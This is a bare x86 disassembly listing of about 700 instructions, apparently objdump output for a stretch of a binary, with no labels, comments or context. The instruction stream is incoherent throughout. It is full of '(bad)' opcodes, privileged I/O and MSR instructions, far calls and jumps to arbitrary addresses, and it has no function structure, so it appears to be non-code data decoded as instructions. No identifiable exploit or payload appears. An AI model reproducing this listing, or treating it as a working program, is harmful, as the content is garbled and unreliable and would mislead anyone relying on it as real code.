  4175c2:	mov    bl,0x3e
  4175c4:	fidiv  WORD PTR [edx+eax*2+0x59083f4]
  4175cb:	mov    BYTE PTR [ecx],cl
  4175cd:	mov    al,0x4
  4175cf:	or     dh,BYTE PTR [ecx]
  4175d1:	lock mov ?,esi
  4175d4:	loope  0x4175cc
  4175d6:	hlt    
  4175d7:	xor    DWORD PTR [eax+0x5d41bae],esp
  4175dd:	ins    DWORD PTR es:[edi],dx
  4175de:	or     dh,BYTE PTR [ebx]
  4175e0:	and    al,0x5b
  4175e2:	mov    dl,0x4d
  4175e4:	int3   
  4175e5:	or     bl,bl
  4175e7:	cwde   
  4175e8:	sbb    al,0x1d
  4175ea:	lahf   
  4175eb:	xlat   BYTE PTR ds:[ebx]
  4175ec:	sbb    ebp,edx
  4175ee:	xchg   edi,eax
  4175ef:	adc    bl,BYTE PTR [edi-0x66]
  4175f2:	and    DWORD PTR [esi+eax*8+0x269b4f88],0xffffffc4
  4175fa:	lds    edi,FWORD PTR [ebx]
  4175fc:	call   0x6038:0xdaec55
  417603:	mov    bl,0x8d
  417605:	outs   dx,BYTE PTR ds:[esi]
  417606:	jp     0x417595
  417608:	cld    
  417609:	adc    BYTE PTR [eax-0x65],al
  41760c:	mov    eax,ds:0xd629e1ac
  417611:	out    0xf8,al
  417613:	xor    edx,0x1e
  417616:	out    0xfe,eax
  417618:	add    esi,DWORD PTR [ecx]
  41761a:	cmp    ebx,DWORD PTR [esi-0x52]
  41761d:	mov    ch,0x18
  41761f:	add    esp,edi
  417621:	push   0x2e
  417623:	xor    edx,ecx
  417625:	leave  
  417626:	aad    0x8d
  417628:	es es icebp 
  41762b:	mov    bl,0x82
  41762d:	ret    0xe8eb
  417630:	cmc    
  417631:	jl     0x4175df
  417633:	adc    al,0x32
  417635:	fcomp  st(6)
  417637:	or     dl,ah
  417639:	test   eax,0x86caf747
  41763e:	mov    ds:0xd90b3ab5,al
  417643:	pop    ebx
  417644:	stos   BYTE PTR es:[edi],al
  417645:	mov    cs,WORD PTR [ecx-0x42]
  417648:	fcomp  st(1)
  41764a:	xor    esp,DWORD PTR [ecx+0xdcfd5b1]
  417650:	pop    ecx
  417651:	sub    edx,edx
  417653:	add    al,0x22
  417655:	in     al,dx
  417656:	cmp    al,dh
  417658:	sub    cl,bh
  41765a:	outs   dx,DWORD PTR ds:[esi]
  41765b:	push   eax
  41765c:	cmp    dh,bl
  41765e:	sti    
  41765f:	int    0xdd
  417661:	shl    ecx,0x33
  417664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417665:	test   eax,0x935bc560
  41766a:	xchg   ebp,eax
  41766b:	nop
  41766c:	push   cs
  41766d:	pop    ebp
  41766e:	pop    ebx
  41766f:	ret    0x8625
  417672:	pop    edi
  417673:	test   ebp,esi
  417675:	xor    al,0x7a
  417677:	ja     0x417690
  417679:	fstp   QWORD PTR [ebx]
  41767b:	sub    dl,BYTE PTR [ebp+0x33]
  41767e:	jns    0x41769a
  417680:	(bad)  
  417681:	mov    cl,0x43
  417683:	xchg   edi,eax
  417684:	push   0x7434ccb0
  417689:	bound  eax,QWORD PTR [ebx+0x48]
  41768c:	pop    ebp
  41768d:	icebp  
  41768e:	not    ebx
  417690:	xchg   ecx,eax
  417691:	adc    dl,dl
  417693:	sub    ebp,esp
  417695:	(bad)  
  417697:	xlat   BYTE PTR ds:[ebx]
  417698:	inc    ebp
  417699:	push   DWORD PTR [edx+0x25b378c2]
  41769f:	jo     0x4176da
  4176a1:	jnp    0x417655
  4176a3:	das    
  4176a4:	in     eax,0x74
  4176a6:	stos   DWORD PTR es:[edi],eax
  4176a7:	adc    eax,0x6824de52
  4176ac:	push   cs
  4176ad:	inc    ebp
  4176ae:	ins    DWORD PTR es:[edi],dx
  4176af:	retf   
  4176b0:	adc    ebp,DWORD PTR [edi-0x19]
  4176b3:	xchg   esi,eax
  4176b4:	dec    ebx
  4176b5:	xor    BYTE PTR [edi+0x3d083750],dh
  4176bb:	loop   0x417719
  4176bd:	add    BYTE PTR [edx+0x26c4061c],dh
  4176c3:	add    BYTE PTR [esi+0x1a],ch
  4176c6:	cwde   
  4176c7:	mov    edi,0xe1e9434f
  4176cc:	push   0x2830c0f4
  4176d1:	pop    ebp
  4176d2:	test   eax,0x69f1a315
  4176d7:	popf   
  4176d8:	dec    ecx
  4176d9:	mov    dl,0x94
  4176db:	and    bh,BYTE PTR [esi]
  4176dd:	(bad)  
  4176de:	ss and eax,0x7a4f6ab
  4176e4:	sub    eax,0x4f866b77
  4176e9:	cmp    ebp,DWORD PTR [edx-0xf58eb85]
  4176ef:	push   esp
  4176f0:	pop    esp
  4176f1:	inc    ebp
  4176f2:	fcmovnu st,st(5)
  4176f4:	popa   
  4176f5:	frndint 
  4176f7:	(bad)
  4176fa:	(bad)  
  4176fb:	cmp    DWORD PTR [ebx],esi
  4176fd:	xor    BYTE PTR ds:0x12c390cb,dh
  417703:	test   al,0x5f
  417705:	sub    BYTE PTR [ebp+ebx*4-0x4d],bh
  417709:	and    BYTE PTR [ecx+0x28d067b5],dh
  41770f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417710:	loopne 0x417730
  417712:	int3   
  417713:	sbb    al,0x8d
  417715:	push   ds
  417716:	xchg   dh,bh
  417718:	sub    BYTE PTR [ebp+0x7b],0x4d
  41771c:	ret    0xd19f
  41771f:	jb     0x4176eb
  417721:	shr    DWORD PTR [ebx-0x58],cl
  417724:	repz pushf 
  417726:	mov    ebp,0xfabbd3b7
  41772b:	mov    dl,0xeb
  41772d:	mov    al,0x95
  41772f:	fldenv [eax+0x34c3124]
  417735:	sub    BYTE PTR [esi-0x6],dh
  417738:	test   al,0x5b
  41773a:	sbb    eax,0xdbc927c0
  41773f:	ins    DWORD PTR es:[edi],dx
  417740:	cs scas al,BYTE PTR es:[edi]
  417742:	ds fcmovb st,st(6)
  417745:	jae    0x417782
  417747:	sub    DWORD PTR [ecx+0x40e577b8],esi
  41774d:	sbb    eax,DWORD PTR [edi]
  41774f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417750:	fst    QWORD PTR [esi]
  417752:	or     eax,0xd4f8d7b9
  417757:	push   edx
  417758:	scas   al,BYTE PTR es:[edi]
  417759:	pop    ebp
  41775a:	fist   WORD PTR [ecx]
  41775c:	mov    eax,0x84a7cbd2
  417761:	scas   al,BYTE PTR es:[edi]
  417762:	pop    edi
  417763:	xchg   esp,eax
  417764:	cmpxchg DWORD PTR [ecx],ebp
  417767:	or     BYTE PTR es:[edi+ebp*8+0x68],bh
  41776c:	inc    edx
  41776d:	bound  edx,QWORD PTR [edi-0x6e91f318]
  417773:	xchg   BYTE PTR ds:[ebp+0x293b556b],al
  41777a:	rcl    DWORD PTR [esi],cl
  41777c:	pop    ss
  41777d:	cli    
  41777e:	sbb    cl,dh
  417780:	aad    0x35
  417782:	sbb    al,0x88
  417784:	mov    esp,0xe43eeb2
  417789:	fnsave [esi]
  41778b:	cdq    
  41778c:	add    DWORD PTR [ecx+0x3333d199],edx
  417792:	xchg   DWORD PTR [eax-0xe],esp
  417795:	pop    esp
  417796:	sahf   
  417797:	pop    ebx
  417798:	aam    0x32
  41779a:	inc    esi
  41779b:	ins    BYTE PTR es:[edi],dx
  41779c:	nop
  41779d:	or     edx,DWORD PTR [edx+0x5b]
  4177a0:	inc    ebp
  4177a1:	stos   DWORD PTR es:[edi],eax
  4177a2:	fsubr  QWORD PTR [eax+eiz*8+0x2f]
  4177a6:	sub    DWORD PTR [ebp-0x28b55a],0x9aaf10b
  4177b0:	popf   
  4177b1:	mov    ds:0xe8d49f48,eax
  4177b6:	ret    
  4177b7:	std    
  4177b8:	test   BYTE PTR [edx+0x6],al
  4177bb:	cs add ah,dh
  4177be:	lods   eax,DWORD PTR ds:[esi]
  4177bf:	dec    edi
  4177c0:	inc    edx
  4177c1:	dec    ecx
  4177c2:	scas   eax,DWORD PTR es:[edi]
  4177c3:	xor    BYTE PTR [esp+ebx*8-0x5f],dh
  4177c7:	aad    0xca
  4177c9:	xchg   edx,eax
  4177ca:	int    0x39
  4177cc:	out    dx,eax
  4177cd:	ficomp DWORD PTR [edx+0x5]
  4177d0:	ds scas al,BYTE PTR es:[edi]
  4177d2:	(bad)  
  4177d3:	sbb    al,0xbd
  4177d5:	push   0xcea5cb2c
  4177da:	mov    edx,0x1fc7d51b
  4177df:	push   esi
  4177e0:	in     al,0xea
  4177e2:	hlt    
  4177e3:	dec    edi
  4177e4:	neg    DWORD PTR [ebx]
  4177e6:	imul   esp,DWORD PTR [ebx+0x7c],0x6836d864
  4177ed:	mul    DWORD PTR [edi-0x24]
  4177f0:	mov    ds:0xff0f2cd7,eax
  4177f5:	into   
  4177f6:	adc    al,BYTE PTR [edi+eiz*1-0x20ee93e7]
  4177fd:	mov    ds:0xc8d27782,al
  417802:	out    0xf,al
  417804:	pop    eax
  417805:	ror    BYTE PTR [ecx],0xd9
  417808:	dec    esi
  417809:	or     DWORD PTR [ebp-0x5c],esi
  41780c:	nop
  41780d:	aaa    
  41780e:	pop    ds
  41780f:	jle    0x417877
  417811:	xchg   BYTE PTR [ecx+0x64],ch
  417814:	mov    DWORD PTR [eax+0x68],edi
  417817:	push   cs
  417818:	jnp    0x4177ff
  41781a:	fsub   DWORD PTR [ebp+0x4a]
  41781d:	jecxz  0x41789b
  41781f:	mov    ah,0x90
  417821:	or     DWORD PTR [ebp+0x64715e76],edi
  417827:	inc    eax
  417828:	fwait
  417829:	pxor   mm6,mm7
  41782c:	mov    al,ds:0xe6ca200e
  417831:	lock xor al,0x90
  417834:	out    0x64,al
  417836:	xchg   edx,eax
  417837:	test   BYTE PTR [esi+0x5b],bh
  41783a:	shl    dh,1
  41783c:	xchg   dl,al
  41783e:	fdivr  QWORD PTR [ebx-0x277d87da]
  417844:	lds    esi,FWORD PTR [eax]
  417846:	or     BYTE PTR [eax+eax*4],bl
  417849:	jmp    0xf7646806
  41784e:	retf   0xa38a
  417851:	push   es
  417852:	imul   ecx,DWORD PTR [edi+0x5c],0x45f2ecba
  417859:	(bad)  
  41785a:	nop
  41785b:	dec    ecx
  41785c:	fucomip st,st(4)
  41785e:	add    BYTE PTR [esi-0x6],dl
  417861:	ror    DWORD PTR [eax+0x57cb1d97],0x1c
  417868:	pop    esp
  417869:	mov    ebp,0xda00d042
  41786e:	xchg   edx,eax
  41786f:	retf   0x6809
  417872:	ins    BYTE PTR es:[edi],dx
  417873:	int3   
  417874:	fwait
  417875:	add    al,0x77
  417877:	retf   0xd69c
  41787a:	pop    ss
  41787b:	jne    0x4178bb
  41787d:	mov    eax,ds:0xd1ac474b
  417882:	fxch   st(1)
  417884:	jge    0x4178dd
  417886:	adc    al,0x6c
  417888:	wrmsr  
  41788a:	pop    esp
  41788b:	sub    al,0x8d
  41788d:	fwait
  41788e:	sbb    esi,DWORD PTR [eax+0x73]
  417891:	add    eax,0xbb46c27a
  417896:	sub    DWORD PTR [edi+ecx*4-0x31],0xe00a1ae6
  41789e:	cmp    eax,0xf5ad3934
  4178a3:	inc    esp
  4178a4:	pop    ebx
  4178a5:	push   edx
  4178a7:	fcmovu st,st(2)
  4178a9:	cli    
  4178aa:	loope  0x417880
  4178ac:	pop    ds
  4178ad:	sbb    esi,ebp
  4178af:	push   ecx
  4178b0:	fisub  DWORD PTR ds:0xfa85a0c4
  4178b6:	adc    eax,0xbde6e9e7
  4178bb:	pusha  
  4178bc:	(bad)  
  4178bd:	and    al,ah
  4178bf:	add    BYTE PTR [edi+0x37cd9dfa],bh
  4178c5:	xor    BYTE PTR [edi+0x75],bh
  4178c8:	ins    DWORD PTR es:[edi],dx
  4178c9:	add    esi,DWORD PTR [esp+edx*4]
  4178cc:	inc    esp
  4178cd:	sti    
  4178ce:	pop    ecx
  4178cf:	cld    
  4178d0:	out    dx,eax
  4178d1:	inc    ebp
  4178d2:	push   ebx
  4178d3:	cmp    eax,0x70d56283
  4178d8:	xchg   ebx,eax
  4178d9:	loopne 0x4178bd
  4178db:	jb     0x41791a
  4178dd:	dec    ebx
  4178de:	scas   eax,DWORD PTR es:[edi]
  4178df:	retf   0x5119
  4178e2:	sbb    BYTE PTR [eax+edi*8-0x51],bl
  4178e6:	rcr    edx,1
  4178e8:	(bad)  [ebx]
  4178ea:	retf   0xf53c
  4178ed:	mov    ebx,0x6480a0ab
  4178f2:	pop    eax
  4178f3:	sbb    eax,0xfc341ef2
  4178f8:	pop    ss
  4178f9:	les    sp,DWORD PTR [ecx+0x1d6b45a2]
  417900:	cmp    eax,0xb7997b33
  417905:	sahf   
  417906:	mov    ch,0xe3
  417908:	pop    es
  417909:	and    DWORD PTR [esi-0x4a2760b8],eax
  41790f:	sub    BYTE PTR [ebx-0x53115663],al
  417915:	retf   
  417916:	sti    
  417917:	add    al,0x78
  417919:	push   es
  41791a:	stc    
  41791b:	xchg   edi,eax
  41791c:	sbb    eax,DWORD PTR [edx+0x5f64bc7f]
  417922:	es out 0xf3,eax
  417925:	or     cl,dl
  417927:	cmp    al,0x33
  417929:	mov    ds:0x314214bf,al
  41792e:	mov    WORD PTR [esp+esi*4+0x3c],?
  417932:	jp     0x41791d
  417934:	mov    ecx,0x44604404
  417939:	push   ds
  41793a:	add    ecx,esp
  41793c:	in     al,0x7
  41793e:	nop
  41793f:	adc    BYTE PTR [eax+0x2a],ah
  417942:	aas    
  417943:	repz (bad) 
  417945:	sbb    bl,BYTE PTR [eax+0x7a]
  417948:	or     bl,BYTE PTR [ebp-0x1d]
  41794b:	je     0x4178d4
  41794d:	ins    BYTE PTR es:[edi],dx
  41794e:	cli    
  41794f:	sti    
  417950:	hlt    
  417951:	std    
  417952:	xor    ebx,DWORD PTR ds:0xdb34feb7
  417958:	pusha  
  417959:	js     0x417916
  41795b:	xor    eax,0xf3946c62
  417960:	cmp    al,0x63
  417962:	out    dx,al
  417963:	je     0x417963
  417965:	das    
  417966:	repz sahf 
  417968:	inc    eax
  417969:	jmp    0x41795e
  41796b:	inc    eax
  41796c:	cmp    al,0x14
  41796e:	loope  0x41799d
  417970:	or     ecx,DWORD PTR [edi+0x6a]
  417973:	popa   
  417974:	in     al,dx
  417975:	cmp    BYTE PTR [esi],0x12
  417978:	bound  esp,QWORD PTR [ebp-0x43]
  41797b:	dec    edx
  41797c:	inc    ebp
  41797d:	cwde   
  41797e:	loopne 0x417958
  417980:	cld    
  417981:	push   ecx
  417982:	mov    al,0x6d
  417984:	add    BYTE PTR [ebp-0x2cc78850],bl
  41798a:	cld    
  41798b:	mov    esi,0x422f4c11
  417990:	pusha  
  417991:	cmc    
  417992:	push   0x73
  417994:	inc    ebp
  417995:	cmp    BYTE PTR [ebx],cl
  417997:	ss add eax,0x9cc40a3d
  41799d:	ja     0x4179a0
  41799f:	rol    DWORD PTR [ebx+eiz*4],1
  4179a2:	je     0x417934
  4179a4:	mov    ds:0x1b4f2f47,eax
  4179a9:	fdiv   DWORD PTR [ecx]
  4179ab:	and    ah,BYTE PTR [esi-0x30361015]
  4179b1:	fld    TBYTE PTR [edi-0x38]
  4179b4:	mov    ebp,0x3b2c79e
  4179b9:	and    BYTE PTR [ebx],bh
  4179bb:	or     al,0x6b
  4179bd:	sub    eax,0xb2f57127
  4179c2:	sbb    eax,0x72786682
  4179c7:	aam    0x8a
  4179c9:	adc    BYTE PTR [eax+0x4c],0x91
  4179cd:	fcomp  QWORD PTR [ebp+0x30]
  4179d0:	cdq    
  4179d1:	nop
  4179d2:	lahf   
  4179d3:	pop    ebp
  4179d4:	mov    bh,0x5f
  4179d6:	inc    eax
  4179d7:	lods   al,BYTE PTR ds:[esi]
  4179d8:	jo     0x417a48
  4179da:	jno    0x4179c0
  4179dc:	(bad)  ds:0x6f176967
  4179e2:	push   fs
  4179e4:	fld    TBYTE PTR [ecx-0x22]
  4179e7:	test   BYTE PTR [eax],ch
  4179e9:	pop    esi
  4179ea:	rcr    DWORD PTR [esi+0x1406dd29],cl
  4179f0:	adc    BYTE PTR [eax+edx*8-0x49],ch
  4179f4:	outs   dx,BYTE PTR ds:[esi]
  4179f5:	(bad)  
  4179f6:	pop    edi
  4179f7:	out    0x85,al
  4179f9:	or     cl,al
  4179fb:	xor    DWORD PTR ds:0x1fa5c5a0,0xffffffd8
  417a02:	bnd jns 0x417a53
  417a05:	stc    
  417a06:	push   edx
  417a07:	sub    ecx,esi
  417a09:	retf   0xd2a1
  417a0c:	retf   
  417a0d:	xlat   BYTE PTR ds:[ebx]
  417a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a0f:	push   0x8
  417a11:	or     eax,DWORD PTR [edx]
  417a13:	sub    al,0x5e
  417a15:	leave  
  417a16:	imul   esi,DWORD PTR ds:0x8eec5194,0x1575524f
  417a20:	pop    ds
  417a21:	or     bh,BYTE PTR [ecx+0xadc05d3]
  417a27:	or     esi,DWORD PTR ds:0x96a3b502
  417a2d:	add    DWORD PTR [edi],ecx
  417a2f:	pop    ecx
  417a30:	repnz mov ah,0xf9
  417a33:	sub    edi,DWORD PTR [ecx]
  417a35:	in     al,dx
  417a36:	rcl    BYTE PTR [edx-0x529b44ac],0xcc
  417a3d:	fdiv   st(6),st
  417a3f:	enter  0x85e5,0xdd
  417a43:	repz bound ebx,QWORD PTR gs:[ebx-0x43]
  417a48:	gs mov ebp,0xcb73c62b
  417a4e:	jne    0x417a0b
  417a50:	addr16 cmc 
  417a52:	fst    QWORD PTR ds:0x61333db4
  417a58:	push   cs
  417a59:	mov    cl,0x2
  417a5b:	add    BYTE PTR [ecx],al
  417a5d:	mov    bl,0x6
  417a5f:	sbb    DWORD PTR [edx+ecx*1+0x21],ecx
  417a63:	out    0x3d,al
  417a65:	xchg   esi,eax
  417a66:	push   ss
  417a67:	sbb    BYTE PTR [edx+0x55],dh
  417a6a:	push   ecx
  417a6b:	push   cs
  417a6c:	int    0x38
  417a6e:	js     0x417a2f
  417a70:	stos   DWORD PTR es:[edi],eax
  417a71:	jne    0x417ac9
  417a73:	fild   DWORD PTR [esi]
  417a75:	(bad)  
  417a76:	aas    
  417a77:	pop    ss
  417a78:	pusha  
  417a79:	adc    dh,dl
  417a7b:	shl    cl,0x54
  417a7e:	mov    bh,0xb9
  417a80:	sbb    esp,DWORD PTR [eax-0x78]
  417a83:	or     BYTE PTR [ebx+0x43],bl
  417a86:	fld    TBYTE PTR [ecx+0x19]
  417a89:	ss jp  0x417aa6
  417a8c:	pushf  
  417a8d:	push   edx
  417a8e:	inc    edx
  417a8f:	cmp    bl,BYTE PTR [eax+0x62]
  417a92:	stc    
  417a93:	sub    al,0xd5
  417a95:	push   cs
  417a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a97:	popf   
  417a98:	and    BYTE PTR [edi],bl
  417a9a:	cmp    bh,BYTE PTR [ebp-0x25]
  417a9d:	dec    ebp
  417a9e:	jo     0x417a4d
  417aa0:	xchg   edx,eax
  417aa1:	aad    0xf6
  417aa3:	pushf  
  417aa4:	(bad)  
  417aa5:	into   
  417aa6:	call   0x548a:0xc0b2b25a
  417aad:	popa   
  417aae:	xlat   BYTE PTR ds:[ebx]
  417aaf:	das    
  417ab0:	or     BYTE PTR [ebx],bl
  417ab2:	shl    DWORD PTR [edi+0x6dac91ec],0x70
  417ab9:	test   al,0x32
  417abb:	mov    ecx,0x5695a6fa
  417ac0:	and    esp,esi
  417ac2:	jp     0x417a84
  417ac4:	cs jo  0x417a47
  417ac7:	repnz push esp
  417ac9:	clc    
  417aca:	mov    ds:0xff72564c,eax
  417acf:	add    dh,BYTE PTR [ecx]
  417ad1:	mov    ss,WORD PTR [edx-0x41b74f9]
  417ad7:	jmp    0x63de4090
  417adc:	mov    edi,0xb2fffdfc
  417ae1:	popf   
  417ae2:	not    BYTE PTR [esi+eiz*1]
  417ae5:	lea    esi,[ebp+0x52821b0d]
  417aeb:	pop    esi
  417aec:	mov    ah,0xd3
  417aee:	icebp  
  417aef:	push   ebp
  417af0:	sub    BYTE PTR [esi-0x63],dl
  417af3:	mov    ds:0xf5363754,eax
  417af8:	outs   dx,BYTE PTR ds:[esi]
  417af9:	imul   ebx,edi,0xffffffa4
  417afc:	mov    bl,0xdb
  417afe:	ss lock dec eax
  417b01:	out    0xef,al
  417b03:	mov    bh,0xf
  417b05:	hlt    
  417b06:	not    BYTE PTR [edi]
  417b08:	js     0x417ace
  417b0a:	rol    DWORD PTR [esi+ecx*1],1
  417b0d:	dec    esp
  417b0e:	sub    eax,0x90aa37ee
  417b13:	xor    edi,DWORD PTR [ebx]
  417b15:	mov    al,0x71
  417b17:	das    
  417b18:	and    eax,0xe9e21d29
  417b1d:	std    
  417b1e:	sbb    DWORD PTR [ebx-0x462cdba7],edx
  417b24:	jmp    0x3351:0xe67583c7
  417b2b:	ins    BYTE PTR es:[edi],dx
  417b2c:	or     BYTE PTR [eax-0x75],al
  417b2f:	dec    ebp
  417b30:	push   ebp
  417b31:	and    al,0x3e
  417b33:	pshufb mm5,QWORD PTR [ebx]
  417b37:	scas   al,BYTE PTR es:[edi]
  417b38:	adc    DWORD PTR [esi-0x44a4c935],0xffffff88
  417b3f:	or     DWORD PTR [esi],esp
  417b41:	(bad)  
  417b42:	aas    
  417b43:	(bad)
  417b47:	into   
  417b48:	xor    eax,0x7ffe9fde
  417b4e:	push   ds
  417b4f:	mov    ecx,0x72760565
  417b54:	jno    0x417b31
  417b56:	lods   eax,DWORD PTR ds:[esi]
  417b57:	aad    0x26
  417b59:	add    eax,0xbf271391
  417b5e:	js     0x417b6b
  417b60:	xchg   ebp,eax
  417b61:	call   0x92c9fbf2
  417b66:	dec    ebp
  417b67:	and    al,0x52
  417b69:	(bad)  
  417b6a:	jne    0x417af2
  417b6c:	mov    al,BYTE PTR [esi-0x199ca09]
  417b72:	stos   BYTE PTR es:[edi],al
  417b73:	dec    ebx
  417b74:	mov    ecx,0x3b4d2e51
  417b79:	std    
  417b7a:	mov    edi,0x8d995bbb
  417b7f:	adc    bh,BYTE PTR [ebx+0x46063da8]
  417b85:	in     al,dx
  417b86:	idiv   BYTE PTR [edx+ebp*8-0x1d]
  417b8a:	or     BYTE PTR [ecx-0x51],al
  417b8d:	fistp  DWORD PTR [esi-0x188727f5]
  417b93:	xor    al,0xcb
  417b95:	xchg   BYTE PTR ds:0xe8a4a17e,dl
  417b9b:	dec    BYTE PTR [edi]
  417b9d:	into   
  417b9e:	pop    ecx
  417b9f:	fisttp QWORD PTR [ebx+eiz*1+0x2bacc1fe]
  417ba6:	cmp    al,0xd7
  417ba8:	adc    eax,0x277384af
  417bad:	xchg   edx,eax
  417bae:	jo     0x417b7f
  417bb0:	mov    DWORD PTR [ebx+0x77],ebx
  417bb3:	mov    ch,0xcd
  417bb5:	ins    BYTE PTR es:[edi],dx
  417bb6:	push   ebp
  417bb7:	dec    esi
  417bb8:	xchg   edi,esi
  417bba:	dec    edi
  417bbb:	inc    esp
  417bbc:	mov    eax,0x19ec4b
  417bc1:	jne    0x417b79
  417bc3:	xchg   esi,eax
  417bc4:	js     0x417bb6
  417bc6:	push   esp
  417bc7:	daa    
  417bc8:	dec    edi
  417bc9:	mov    ecx,0x71882f44
  417bce:	mov    dh,0xd9
  417bd0:	les    ebx,FWORD PTR [esi]
  417bd2:	mov    esp,0xeb28eb33
  417bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bd8:	jmp    DWORD PTR [edx]
  417bda:	stos   DWORD PTR es:[edi],eax
  417bdb:	das    
  417bdc:	je     0x417bfc
  417bde:	add    esp,esi
  417be0:	je     0x417c26
  417be2:	cdq    
  417be3:	xchg   BYTE PTR [ecx],dl
  417be5:	imul   esi,DWORD PTR [esi],0xffffffb8
  417be8:	retf   0x643e
  417beb:	jp     0x417c53
  417bed:	inc    ecx
  417bee:	or     BYTE PTR [edi-0x57],cl
  417bf1:	jo     0x417b9a
  417bf3:	stos   DWORD PTR es:[edi],eax
  417bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bf5:	push   esi
  417bf6:	or     esp,ebx
  417bf8:	int    0x4e
  417bfa:	das    
  417bfb:	retf   
  417bfc:	mov    al,ds:0xb34182d2
  417c01:	push   0xffffffdc
  417c03:	xor    al,0x19
  417c05:	adc    dh,cl
  417c07:	xchg   ebp,eax
  417c08:	push   edi
  417c09:	ins    BYTE PTR es:[edi],dx
  417c0a:	sbb    esp,DWORD PTR [ecx-0x28]
  417c0d:	jae    0x417c20
  417c0f:	sub    eax,0x4c67ea84
  417c14:	push   ss
  417c15:	dec    esp
  417c16:	js     0x417bbb
  417c18:	or     DWORD PTR [ecx-0x61],0x4bac2431
  417c1f:	enter  0xe9,0xa2
  417c23:	clc    
  417c24:	push   edi
  417c25:	stos   DWORD PTR es:[edi],eax
  417c26:	xor    esp,DWORD PTR [ecx+ebp*4]
  417c29:	adc    ch,bl
  417c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c2c:	dec    ecx
  417c2d:	jns    0x417c4e
  417c2f:	or     edi,DWORD PTR [ebx-0x35]
  417c32:	out    dx,eax
  417c33:	and    al,0x11
  417c35:	outs   dx,DWORD PTR ds:[esi]
  417c36:	stos   BYTE PTR es:[edi],al
  417c37:	outs   dx,DWORD PTR ds:[esi]
  417c38:	popa   
  417c39:	stc    
  417c3a:	pop    eax
  417c3b:	push   cs
  417c3c:	cwde   
  417c3d:	clc    
  417c3e:	jae    0x417c43
  417c40:	fdiv   QWORD PTR [esi]
  417c42:	jbe    0x417c1b
  417c44:	js     0x417c82
  417c46:	add    ah,BYTE PTR [ebx]
  417c48:	outs   dx,BYTE PTR ds:[esi]
  417c49:	pusha  
  417c4a:	inc    ecx
  417c4b:	add    esp,ecx
  417c4d:	mov    ebx,0x52e71859
  417c52:	xchg   ecx,eax
  417c53:	and    edi,esp
  417c55:	sar    BYTE PTR [edi-0x10c186cc],0x23
  417c5c:	repnz adc ch,BYTE PTR [esi-0x463617d3]
  417c63:	mov    esp,0xd39d598d
  417c68:	xor    BYTE PTR [esp+edi*1],cl
  417c6b:	or     eax,0xac2ca9dd
  417c70:	mov    bh,BYTE PTR [ebp-0x9]
  417c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c74:	xchg   edi,eax
  417c75:	(bad)
  417c79:	aaa    
  417c7a:	mov    ebp,0x4d3a649b
  417c7f:	das    
  417c80:	dec    ebp
  417c81:	hlt    
  417c82:	or     DWORD PTR [ebx+edi*4+0x45],0xdd61180c
  417c8a:	ins    BYTE PTR es:[edi],dx
  417c8b:	sahf   
  417c8c:	jecxz  0x417c73
  417c8e:	push   ecx
  417c8f:	sbb    BYTE PTR [ecx-0x6b],cl
  417c92:	stc    
  417c93:	out    0x36,al
  417c95:	pop    edi
  417c96:	test   eax,0x60f3755a
  417c9b:	pop    esp
  417c9c:	push   0x47
  417c9e:	inc    esp
  417c9f:	les    eax,FWORD PTR [edx-0x4bd7a1cd]
  417ca5:	xchg   ebp,eax
  417ca6:	rcr    bh,cl
  417ca8:	mov    ebp,DWORD PTR [eax-0x5f]
  417cab:	jmp    0x9fc77c79
  417cb0:	(bad)  
  417cb1:	(bad)  
  417cb2:	sub    eax,0xad2cde18
  417cb7:	bound  edi,QWORD PTR ds:0x5ac5b281
  417cbd:	adc    BYTE PTR [eax+0x8],bl
  417cc0:	cmp    al,0xbe
  417cc2:	mov    eax,ds:0xa76fc751
  417cc7:	fnstenv [ecx+0x78]
  417cca:	std    
  417ccb:	ins    BYTE PTR es:[edi],dx
  417ccc:	pop    es
  417ccd:	or     eax,DWORD PTR [ecx]
  417ccf:	retf   0x4b26
  417cd2:	dec    ebp
  417cd3:	icebp  
  417cd4:	ret    
  417cd5:	adc    BYTE PTR [ebx],0x1
  417cd8:	outs   dx,DWORD PTR ds:[esi]
  417cd9:	xor    ch,BYTE PTR [esi+0x33]
  417cdc:	cdq    
  417cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cde:	or     eax,0x42551cdc
  417ce3:	add    al,0x1d
  417ce5:	outs   dx,DWORD PTR ds:[esi]
  417ce6:	mov    edi,0x1ae65e69
  417ceb:	dec    eax
  417cec:	sbb    ebx,DWORD PTR [eax+eiz*8]
  417cef:	cmp    BYTE PTR [edi+0x402509d3],bh
  417cf5:	xor    dh,dh
  417cf7:	mov    al,ds:0x72238cad
  417cfc:	xor    BYTE PTR ds:0xf015e254,dh
  417d02:	cs iret 
  417d04:	(bad)  
  417d05:	std    
  417d06:	dec    edi
  417d07:	inc    eax
  417d08:	clc    
  417d09:	mov    dl,0x87
  417d0b:	dec    esi
  417d0c:	lahf   
  417d0d:	iret   
  417d0e:	daa    
  417d0f:	test   al,0x0
  417d11:	hlt    
  417d12:	inc    esp
  417d13:	(bad)  
  417d14:	call   0x937eedbf
  417d19:	cmp    bh,BYTE PTR [ebp-0x47c56d0a]
  417d1f:	jle    0x417cbf
  417d21:	aas    
  417d22:	jl     0x417d7a
  417d24:	and    al,0x44
  417d26:	lds    eax,FWORD PTR [edi]
  417d28:	jnp    0x417cc5
  417d2a:	aam    0xa5
  417d2c:	xchg   esi,eax
  417d2d:	push   es
  417d2e:	sub    al,0x11
  417d30:	sub    eax,0x726ff36b
  417d35:	fidiv  DWORD PTR [ebp+0x21]
  417d38:	in     al,dx
  417d39:	(bad)  
  417d3a:	fist   DWORD PTR ds:0x515a171d
  417d40:	cmp    BYTE PTR [ebp+0x47],bl
  417d43:	xchg   ecx,eax
  417d44:	stc    
  417d45:	out    dx,al
  417d46:	iret   
  417d47:	add    ecx,DWORD PTR [edx-0x74]
  417d4a:	int    0x0
  417d4c:	stc    
  417d4d:	scas   eax,DWORD PTR es:[edi]
  417d4e:	mov    bl,0x8e
